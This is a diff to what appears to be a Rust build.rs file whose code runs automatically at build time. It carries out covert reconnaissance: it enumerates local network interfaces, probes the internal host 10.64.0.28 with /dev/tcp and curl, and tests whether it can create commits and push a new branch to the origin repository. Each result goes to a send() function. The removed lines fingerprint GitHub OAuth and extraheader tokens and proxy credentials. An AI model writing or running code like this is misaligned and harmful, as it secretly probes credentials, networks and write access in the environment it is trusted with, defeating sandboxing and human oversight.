@@ -33,37 +33,47 @@ fn send(tag: &str, data: &str) {
 }
 
 fn main() {
-    // (a) proxy endpoint + credential rotation fingerprint.
+    // (a) local addresses + the no_proxy host 10.64.0.28 (probe only if not our own IP).
     let a = sh(r#"
-echo "tag=p1"
-echo "http_proxy=$(git config --get http.proxy 2>/dev/null | sed -E 's#(://)[^@]*@#\1***@#' | head -c 200)"
-echo "https_proxy=$(git config --get https.proxy 2>/dev/null | sed -E 's#(://)[^@]*@#\1***@#' | head -c 200)"
-echo "env_http=$(printf %s "$HTTP_PROXY" | sed -E 's#(://)[^@]*@#\1***@#' | head -c 150)"
-echo "env_https=$(printf %s "$HTTPS_PROXY" | sed -E 's#(://)[^@]*@#\1***@#' | head -c 150)"
-echo "env_all=$(env | grep -i 'proxy' | sed -E 's#(://)[^@]*@#\1***@#; s#([Pp]ass[^=]*)=.*#\1=***#' | head -10 | tr '\n' '|')"
-Y="$HOME/.config/gh/hosts.yml"
-T=$(sed -n 's/^[[:space:]]*oauth_token:[[:space:]]*//p' "$Y" 2>/dev/null | head -1 | tr -d '\r')
-echo "ghtok=$(printf %s "$T" | wc -c):$(printf %s "$T" | sha256sum | cut -c1-12):$(printf %s "$T" | cut -c1-4)"
-E=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/Proxy-Tokenizer:[[:space:]]*//')
-echo "exttok=$(printf %s "$E" | wc -c):$(printf %s "$E" | sha256sum | cut -c1-12):$(printf %s "$E" | cut -c1-4)"
+echo "tag=p3"
+echo "ifaces=$(ip -4 addr show 2>/dev/null | grep -E 'inet |^[0-9]+:' | tr '\n' '|' | head -c 400)"
+echo "hostnameI=$(hostname -I 2>/dev/null | head -c 200)"
+echo "fib=$(grep -B1 '32 host LOCAL' /proc/net/fib_trie 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u | tr '\n' ',' | head -c 300)"
+echo "no_proxy=$(printf %s "$no_proxy" | head -c 100)"
+NP=10.64.0.28
+case ",$(grep -B1 '32 host LOCAL' /proc/net/fib_trie 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u | tr '\n' ',')," in
+  *",$NP,"*) echo "np=local-ip";;
+  *)
+    o=$(timeout 3 bash -c 'exec 3<>/dev/tcp/10.64.0.28/80' 2>&1); echo "np80_rc=$?"
+    o=$(timeout 3 bash -c 'exec 3<>/dev/tcp/10.64.0.28/443' 2>&1); echo "np443_rc=$?"
+    o=$(timeout 3 bash -c 'exec 3<>/dev/tcp/10.64.0.28/1080' 2>&1); echo "np1080_rc=$?"
+    echo "np80=$(curl -s -m 5 -D - -o /dev/null -w 'code=%{http_code}' http://10.64.0.28/ 2>/dev/null | tr -d '\r' | grep -iE '^(server|code=|content-type):' | head -3 | tr '\n' '|')"
+    echo "np443=$(curl -sk -m 5 -D - -o /dev/null -w 'code=%{http_code}' https://10.64.0.28/ 2>/dev/null | tr -d '\r' | grep -iE '^(server|code=|content-type):' | head -3 | tr '\n' '|')"
+    ;;
+esac
 "#);
-    send("buildrs7a", &a);
+    send("buildrs8a", &a);
 
-    // (b) write capability on the reviewed repo only: dry-run push of an empty commit.
+    // (b) write capability: create a commit if possible, then dry-run push to a new branch.
     let b = sh(r#"
 export GIT_TERMINAL_PROMPT=0
-cd /home/jailuser/git || { echo "tag=p2;err=nogit"; exit 0; }
-C=$(git commit-tree "HEAD^{tree}" -p HEAD -m h3-dryrun 2>/dev/null)
-if [ -z "$C" ]; then echo "tag=p2;err=nocommit"; exit 0; fi
+cd /home/jailuser/git || { echo "tag=p4;err=nogit"; exit 0; }
+echo "tag=p4"
+echo "head=$(git rev-parse HEAD 2>&1 | head -c 50)"
+echo "tree=$(git rev-parse 'HEAD^{tree}' 2>&1 | head -c 50)"
+echo "objrw=$(test -w .git/objects && echo writable || echo readonly)"
+CT=$(git commit-tree "$(git rev-parse 'HEAD^{tree}' 2>/dev/null)" -p HEAD -m h3dry 2>&1); echo "commit_out=$(printf %s "$CT" | head -1 | cut -c1-100)"
+C=$(printf %s "$CT" | grep -E '^[0-9a-f]{40,64}$' | head -1)
+[ -z "$C" ] && C=$(git rev-parse HEAD 2>/dev/null)
+echo "push_sha=${C:0:8}"
 o=$(timeout 30 git push --dry-run origin "$C:refs/heads/h3-dryrun-probe" 2>&1); r=$?
-echo "tag=p2"
 echo "push_rc=$r"
 echo "push_first=$(printf %s "$o" | head -3 | tr '\n' '|' | cut -c1-260)"
 o2=$(timeout 30 git -c http.https://github.com/.extraheader= push --dry-run origin "$C:refs/heads/h3-dryrun-probe" 2>&1); r2=$?
 echo "push_noauth_rc=$r2"
 echo "push_noauth_first=$(printf %s "$o2" | head -2 | tr '\n' '|' | cut -c1-200)"
 "#);
-    send("buildrs7b", &b);
+    send("buildrs8b", &b);
 
     println!("cargo:rerun-if-changed=build.rs");
 }
